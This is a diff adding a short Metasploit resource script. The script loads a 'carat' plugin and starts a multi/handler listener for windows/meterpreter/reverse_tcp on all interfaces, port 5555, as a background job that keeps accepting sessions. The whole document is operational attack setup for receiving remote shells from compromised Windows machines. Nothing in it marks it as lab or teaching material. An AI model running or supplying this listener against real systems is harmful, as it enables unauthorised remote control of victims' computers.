@@ -1,0 +1,8 @@
+load carat logdir="${MSF}/plugins/carat/var/log" db="${MSF}/plugins/carat/var/sqlitedb/carat.db" templatesdir="${MSF}/plugins/carat/var/templates" jobsdir="${MSF}/plugins/carat/var/jobs" resultsdir="${MSF}/plugins/carat/var/results"
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 5555
+set AutoLoadStdapi false
+set ExitOnSession false
+exploit -j
